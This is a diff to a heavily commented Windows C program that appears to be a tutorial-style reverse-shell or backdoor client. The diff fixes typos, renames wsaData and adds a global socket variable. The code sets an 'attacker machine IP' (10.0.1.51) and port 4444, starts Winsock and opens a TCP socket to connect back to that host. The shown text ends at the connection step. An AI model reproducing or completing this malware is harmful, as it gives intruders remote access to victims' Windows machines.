@@ -13,10 +13,13 @@
 #include <wininet.h> //Allow program to do internet options like downloading and uploading.
 #include <windowsx.h> //Allows to do extra macro functions to make windows program easier.
 
+//Global Variable denotes here
+int sock;
+
 //Let's Start the main function
 // This function is returning integer that why we specify int int the function.
 //Reason to specify 'APIENTRY' Para is every windows program consist of an entry point.
-//And it's also create API access to the program.
+//And it's also create API access to the main program.
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
 {
     //'HINSTANCE' - Used to handle an instance or a module(Executable) that was loaded in the memory.
@@ -44,14 +47,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     //let's assign server port.
     unsigned short ServPort;
     char *ServIP; //which point the memory address of the particular variable.
-    WSADATA wasData;//WSADATA is structure which consist with the windows socket informations.
+    WSADATA wsaData;//WSADATA is structure which consist with the windows socket informations.
 
     ServIP = "10.0.1.51";//here must want to apply the attacker machine IP.
     ServPort = 4444; //Make sure another process is not using same port.
 
 
     //WSAStartup is initiate a process of winsock dll by a process.
-    //ifbsuccessful WSAStartup function will return 0 otherwise exit the program.
+    //if successful WSAStartup function will return 0 otherwise exit the program.
 
     if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
     {
@@ -65,22 +68,22 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     //must specify this variable function in out side of the main funtion. which can be able to access by other functions also.
 
     //AF_INET is used to establish the connection using IPV4.
-    //SOCK_STREAM is used to establish tcp 3 way handshake with the target.
+    //SOCK_STREAM is used to establish TCP 3 way handshake with the target.
     //0 is we not decline anything after connection establishment.
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    //clear all struct varible in zeros using memset function.
+    //clear all struct variable in zeros using memset function.
     //memory location of the variable.
     //Make all the contents to zero to ServAddr.
     //Fill the memory occupied by the ServAddr structure with zeros, for the entire size of the structure.
-    // which helps prevent potential issues caused by uninitialized data.
+    //which helps prevent potential issues caused by uninitialized data.
     memset(&ServAddr, 0, sizeof(ServAddr));
 
     //IPv4 Connection.
     ServAddr.sin_family = AF_INET;
-    //Create the actual IP of our server by converting string to  IP foramy
+    //Create the actual IP of our server by converting string to  IP format.
     ServAddr.sin_addr.s_addr = inet_addr(ServIP);
-    //define port by converting integer to port
+    //define port by converting integer to port.
     ServAddr.sin_port = htons(ServPort);
 
     //Perfoam the connection.
